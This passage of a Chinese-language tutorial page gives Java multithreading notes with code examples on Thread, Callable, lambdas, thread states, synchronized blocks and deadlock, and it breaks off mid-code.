thread.start();&#x2F;&#x2F;调用start()方法开启线程</span><br><span class="line">        &#x2F;&#x2F;简写：new Thread(new TestTread1()).start();</span><br><span class="line"></span><br><span class="line">        for(int i&#x3D;1;i&lt;&#x3D;2000;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(&quot;456&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;运行时会发现，输出123是在456之间进行的</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>问题：多个线程操作同一个资源的情况下，线程不安全，数据紊乱（线程并发问题）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Thread(race,&quot;兔子&quot;).start();&#x2F;&#x2F;可以在开启线程的时候给线程起名</span><br></pre></td></tr></table></figure>
-<p>在run()中用<code>Thread.currentThread().getName()</code>可以调用本线程的名字<br>用<code>Thread.currentThread().getName().equals(&quot;兔子&quot;)</code>可以验证线程的名字（若为“兔子”则返回true）<br>用<code>Thread.sleep(100);</code>来睡眠100毫秒<br>try……catch一般是产生容易出现问题的操作的时候，系统提示要添加的，读代码的时候可以忽略</p>
-<p>Callable接口：<br>1.实现Callable接口，需要返回值类型<br>2.重写call方法，需要抛出异常<br>3.创建目标对象<br>4.创建执行服务：ExecutorService ser = Executors.newFixedThreadPool(1);<br>5.提交执行：Future<Boolean> result1 = ser.submit(t1);<br>6.获取结果：boolean r1 = result1.get();<br>7.关闭服务：ser.shutdownNow();</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.io.FileUtils;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">&#x2F;&#x2F;JUC并发编程</span><br><span class="line">import java.util.concurrent.*;</span><br><span class="line">public class TestCallable implements Callable&lt;Boolean&gt; &#123;</span><br><span class="line">    private String url;</span><br><span class="line">    private String name;</span><br><span class="line">    public TestCallable(String url,String name)&#123;</span><br><span class="line">        this.url &#x3D; url;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public Boolean call() throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F;下载图片</span><br><span class="line">        WebDownloader webDownloader &#x3D; new WebDownloader();&#x2F;&#x2F;下载器</span><br><span class="line">        webDownloader.downloader(url,name);&#x2F;&#x2F;下载文件的方式</span><br><span class="line">        System.out.println(&quot;下载了图片--&gt;&quot;+name);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;启动线程</span><br><span class="line">    public static void main(String[] args) throws ExecutionException, InterruptedException &#123;</span><br><span class="line">        TestCallable t1 &#x3D; new TestCallable(&quot;https:&#x2F;&#x2F;blog.kuangstudy.com&#x2F;usr&#x2F;themes&#x2F;handsome&#x2F;usr&#x2F;img&#x2F;sj&#x2F;1.jpg&quot;,&quot;你好1.jpg&quot;);</span><br><span class="line">        TestCallable t2 &#x3D; new TestCallable(&quot;https:&#x2F;&#x2F;blog.kuangstudy.com&#x2F;usr&#x2F;themes&#x2F;handsome&#x2F;usr&#x2F;img&#x2F;sj&#x2F;2.jpg&quot;,&quot;你好2.jpg&quot;);</span><br><span class="line">        TestCallable t3 &#x3D; new TestCallable(&quot;https:&#x2F;&#x2F;blog.kuangstudy.com&#x2F;usr&#x2F;themes&#x2F;handsome&#x2F;usr&#x2F;img&#x2F;sj&#x2F;3.jpg&quot;,&quot;你好3.jpg&quot;);</span><br><span class="line">        &#x2F;&#x2F;创建执行服务：</span><br><span class="line">        ExecutorService ser &#x3D; Executors.newFixedThreadPool(3);</span><br><span class="line">        &#x2F;&#x2F;提交执行：</span><br><span class="line">        Future&lt;Boolean&gt; result1 &#x3D; ser.submit(t1);</span><br><span class="line">        Future&lt;Boolean&gt; result2 &#x3D; ser.submit(t2);</span><br><span class="line">        Future&lt;Boolean&gt; result3 &#x3D; ser.submit(t3);</span><br><span class="line">        &#x2F;&#x2F;获取结果</span><br><span class="line">        boolean r1 &#x3D; result1.get();</span><br><span class="line">        boolean r2 &#x3D; result2.get();</span><br><span class="line">        boolean r3 &#x3D; result3.get();</span><br><span class="line">        &#x2F;&#x2F;判断线程是否顺利结束或者有异常</span><br><span class="line">        System.out.println(r1);</span><br><span class="line">        System.out.println(r2);</span><br><span class="line">        System.out.println(r3);</span><br><span class="line">        &#x2F;&#x2F;关闭服务</span><br><span class="line">        ser.shutdownNow();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;下载图片</span><br><span class="line">class WebDownloader&#123;</span><br><span class="line">    &#x2F;&#x2F;下载方法</span><br><span class="line">    public void downloader(String url,String name)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            FileUtils.copyURLToFile(new URL(url),new File(name));</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            &#x2F;&#x2F;输出异常信息</span><br><span class="line">            System.out.println(&quot;downloader方法出现异常&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Lamda表达式（一步步简化的过程）：<br>定义接口:inertface<br>1.函数式接口<br>2.实现类<br>3.静态内部类<br>4.局部内部类<br>5.匿名内部类<br>6.lambda简化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lambda;</span><br><span class="line"></span><br><span class="line">public class Test01 &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;静态内部类</span><br><span class="line">    static class Test02 implements Runnable&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            System.out.println(&quot;你好呀lambda！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Test02 test02 &#x3D; new Test02();</span><br><span class="line">        new Thread(test02).start();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;局部内部类</span><br><span class="line">        class Test03 implements Runnable&#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                System.out.println(&quot;你好呀lambda2！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Test03 test03 &#x3D; new Test03();</span><br><span class="line">        new Thread(test03).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;匿名内部类, 需要有一个接口或者父类</span><br><span class="line">        new Thread(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                System.out.println(&quot;你好呀lambda3！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();&#x2F;&#x2F;一般是调用lambda表达式（.lambda();）</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;lambda  jdk.8新增方式</span><br><span class="line">        new Thread(()-&gt;&#123;</span><br><span class="line">            System.out.println(&quot;你好呀lambda4！&quot;);</span><br><span class="line">        &#125;).start();&#x2F;&#x2F;一般是调用lambda表达式（.lambda();）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lambda;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;lambda表达式前提</span><br><span class="line">&#x2F;&#x2F;必须是函数式接口.</span><br><span class="line">&#x2F;&#x2F;必须有返回值(就是那个函数式接口)</span><br><span class="line"></span><br><span class="line">public class Test02 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F;lambda表达式</span><br><span class="line">        ILike like &#x3D; ()-&gt;&#123;</span><br><span class="line">            System.out.println(&quot;我讨厌lambda。。。。5&quot;);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;函数式接口</span><br><span class="line">interface ILike&#123;</span><br><span class="line">    void lambda();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>简化参数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lambda;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;lambda表达式传递参数</span><br><span class="line">&#x2F;&#x2F;隐式前提</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 只有一个参数的情况下,可以简化参数类型 , 参数括号 .</span><br><span class="line">&#x2F;&#x2F; 只有一行代码的情况下 , 可以省略大括号 .</span><br><span class="line"></span><br><span class="line">public class Test03 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ILove love &#x3D; new Love();</span><br><span class="line">        love.lambda(1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;匿名内部类</span><br><span class="line">        love &#x3D; new ILove() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void lambda(int a) &#123;</span><br><span class="line">                System.out.println(&quot;我开始喜欢lambda了....&quot;+a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        love.lambda(2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;lambda表达式</span><br><span class="line">        love &#x3D; (int a)-&gt;&#123;</span><br><span class="line">            System.out.println(&quot;我开始喜欢lambda了....&quot;+a);</span><br><span class="line">        &#125;;</span><br><span class="line">        love.lambda(3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;简化1: 去掉括号</span><br><span class="line">        love &#x3D; a-&gt;&#123;</span><br><span class="line">            System.out.println(&quot;我开始喜欢lambda了....&quot;+a);</span><br><span class="line">        &#125;;</span><br><span class="line">        love.lambda(4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;简化2:去掉花括号</span><br><span class="line">        love &#x3D; a-&gt;System.out.println(&quot;我开始喜欢lambda了....&quot;+a);</span><br><span class="line"></span><br><span class="line">        love.lambda(5);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;函数式接口</span><br><span class="line">interface ILove&#123;</span><br><span class="line">    void lambda(int a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Love implements ILove&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void lambda(int a) &#123;</span><br><span class="line">        System.out.println(&quot;我开始喜欢lambda了....&quot;+a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>线程的五大状态：<br>1.创建状态<br>2.就绪状态<br>3.运行状态<br>4.阻塞状态<br>5.死亡状态</p>
-<p>1–&gt;2:启动线程<br>2–&gt;3:获得CPU资源<br>3–&gt;2:释放CPU资源<br>3–&gt;4:等待程序输入、线程休眠等（sleep等）<br>4–&gt;2:阻塞接触<br>3–&gt;5:程序执行完毕</p>
-<p>setPriority()：更改线程优先级<br>static void sleep()：线程休眠<br>void join()：等待线程终止<br>static void yield()：暂停当前线程，并执行其他线程<br>void interrupt()：中断线程（别用）<br>boolean isAlive()：测试线程是否活动</p>
-<p>停止线程：<br>1.stop()、destroy()方法（JDK提供的，不推荐，已废弃）<br>2.线程自己停下来<br>3.使用一个标志位进行终止变量（flag=false时）<br>比如：某线程的运行是在<code>while(flag)</code>中的，那么想让线程结束则修改flag为false（写一个方法）</p>
-<p>线程休眠：<br>.Sleep(x);//x毫秒的停止<br>sleep存在异常，最好抛出（try……catch）<br>每个对象都有一把锁，sleep不会释放锁</p>
-<p>线程礼让：<br>.yield();<br>当本线程在运行的时候，暂时停止，让cpu重新调度（选择某个线程进行，但是还是有可能让本线程继续运行）</p>
-<p>线程强制执行：<br>.join();<br>作用：强制停止主线程的内容，先运行run()的内容（所选中子线程），然后再运行主线程的内容</p>
-<p>观测线程状态：<br>.getState();(虽然输出的时候是下面的单次，但是如果要做==和！=比较的时候，是和<code>THREAD.State.TERMINATED</code>这样的比较)<br>NEW：还未启动<br>RUNNABLE：正在jvm中运行，但是可能正在等待操作系统的其他资源<br>BLOCKED：受阻塞，并且正在等待监视器锁<br>WAITING：处于等待状态的线程，正在等待另一个线程执行特定的操作<br>TIMED_WAITING：正在等待另一个线程执行动作达到指定等待时间<br>TERMINATED：已退出的线程</p>
-<p>线程优先级：<br>.setPriority();<br>线程优先级高，则权重大（但是并不是必须先被调用，还是看cpu的分配）(性能倒置)<br>默认是最大10，最小1，默认给5<br>先设置优先级再启动</p>
-<p>守护线程：deamon<br>.setDeamon(true);//默认是false表示是用户线程，正常都是用户线程。设为true后，当所有用户线程结束后守护线程自动停止<br>线程分为用户线程和守护线程<br>必须等待用户线程执行完毕，不用等待守护线程执行完毕</p>
-<p>线程不安全机制：<br>并发问题：多线程访问通对象并要更改的情况。————》解决方法：等待机制，进入对象的等待池，形成队列+锁<br>锁机制：synchronized（易造成性能倒置，但是为了安全）<br>如：后台操作日志，内存监控，垃圾回收等待</p>
-<p>不安全案例：<br>1.抢票的时候，出现多个人买到同一张票的情况<br>2.有人拿到了-1和0（多个线程在走到判断那一步的时候都是大于0的，然后分别在判断之后取值-1，就有人取到了0，-1的值）（特别是判断和操作之间有sleep的情况）（同样的情况也会造成银行取钱后余额为负数）<br>3.可能会把两个数组添加到同一个位置（list.add()操作）</p>
-<p>补一个javaSE忽略的知识：<br>创建集合</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list &#x3D; new ArrayList&lt;String&gt;();&#x2F;&#x2F;创建一个字符串集合</span><br><span class="line">list.add(&quot;cacsaca&quot;);&#x2F;&#x2F;添加一个字符串进去</span><br><span class="line">list.size();&#x2F;&#x2F;集合大小</span><br></pre></td></tr></table></figure>
-
-<p>线程不安全的解决方法：<br>同步方法和同步块：<br>一.锁：synchronized(Obj){}<br>1.同步方法：加关键字：synchronized<br>作用：（我的理解）保证所添加的方法只有一个线程在运行，所以应该锁在增删改查的对象<br>2.锁块：synchronized(Obj){}<br>锁的块是变化的量，然后把变化用代码放到里面。<br>作用：（我的理解）凡是带有synchronized(account){}的内容，只有一个线程能运行<br>二.直接用安全类（JUC类）<br>例1：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.syn;</span><br><span class="line"></span><br><span class="line">public class SafeBuyTicket implements Runnable &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;票数</span><br><span class="line">    private int ticketNums &#x3D; 10;</span><br><span class="line">    &#x2F;&#x2F;标志位</span><br><span class="line">    private boolean flag &#x3D; true;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        &#x2F;&#x2F;买票</span><br><span class="line">        while (flag) &#123;</span><br><span class="line">            buyTicket();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;同步方法,关键词synchroinzed.</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;关键字是锁</span><br><span class="line">    &#x2F;&#x2F;实现的机制是队列</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;还能所反射的那个class</span><br><span class="line"></span><br><span class="line">    public synchronized void buyTicket() &#123;</span><br><span class="line">        if (ticketNums &lt;&#x3D; 0) &#123;</span><br><span class="line">            flag &#x3D; false;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;模拟网络延时</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(200);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + &quot;--&gt;拿到了第&quot; + ticketNums-- + &quot;张票&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SafeBuyTicket station &#x3D; new SafeBuyTicket();</span><br><span class="line"></span><br><span class="line">        new Thread(station,&quot;苦逼的我&quot;).start();</span><br><span class="line">        new Thread(station,&quot;牛逼的你们&quot;).start();</span><br><span class="line">        new Thread(station,&quot;可恶的黄牛党&quot;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>例2：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.syn;</span><br><span class="line"></span><br><span class="line">public class SafeBank &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Account2 account &#x3D; new Account2(100,&quot;招商卡&quot;);</span><br><span class="line"></span><br><span class="line">        Bank2 you &#x3D; new Bank2(&quot;痛苦的你&quot;,account,50);</span><br><span class="line">        Bank2 wife &#x3D; new Bank2(&quot;开心的媳妇&quot;,account,100);</span><br><span class="line"></span><br><span class="line">        you.start();</span><br><span class="line">        wife.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;账户</span><br><span class="line">&#x2F;&#x2F;实体类</span><br><span class="line">class Account2&#123;</span><br><span class="line">    int money;&#x2F;&#x2F;余额</span><br><span class="line">    String name; &#x2F;&#x2F;卡名</span><br><span class="line"></span><br><span class="line">    public Account2(int money, String name) &#123;</span><br><span class="line">        this.money &#x3D; money;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;银行</span><br><span class="line">class Bank2 extends Thread&#123;</span><br><span class="line">    &#x2F;&#x2F;存钱:存了多少,取钱:取了多少</span><br><span class="line"></span><br><span class="line">    Account2 account;  &#x2F;&#x2F;账户</span><br><span class="line">    int drawingMoney; &#x2F;&#x2F;取了多少钱</span><br><span class="line">    int nowMoney; &#x2F;&#x2F;手里有多少钱</span><br><span class="line"></span><br><span class="line">    public Bank2(String name,Account2 account,int drawingMoney)&#123;</span><br><span class="line">        super(name);</span><br><span class="line">        this.account &#x3D; account;</span><br><span class="line">        this.drawingMoney &#x3D; drawingMoney;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        drwaing();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;synchronized本身锁的是this.就是这个对象本身</span><br><span class="line">    public void drwaing()&#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;提高性能的代码</span><br><span class="line">        if (account.money&lt;&#x3D;0)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;如何判断锁的对象</span><br><span class="line">        &#x2F;&#x2F; 谁需要实现增删改就去锁定他</span><br><span class="line">        synchronized (account)&#123;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;判断能否取钱</span><br><span class="line">            if (account.money-drawingMoney&lt;0)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+&quot;活该,没取到钱&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;为了放大问题发生性,我们加个延时.</span><br><span class="line">            try &#123;</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;余额 &#x3D; 余额 - 你去走的钱</span><br><span class="line">            account.money &#x3D; account.money - drawingMoney;</span><br><span class="line">            &#x2F;&#x2F;你的钱 &#x3D; 你的钱 + 你取的钱</span><br><span class="line">            nowMoney &#x3D; drawingMoney + nowMoney;</span><br><span class="line"></span><br><span class="line">            System.out.println(this.account.name+&quot;账户余额:&quot;+account.money);</span><br><span class="line">            System.out.println(this.getName()+&quot;手里的钱:&quot;+nowMoney);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>死锁：<br>两个或多个线程互相等待对方的资源，造成都在等待<br>例：解释：两个都抱着自身的锁，只有运行完才能解锁，但是只有对方解锁才能继续运行（锁的嵌套）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 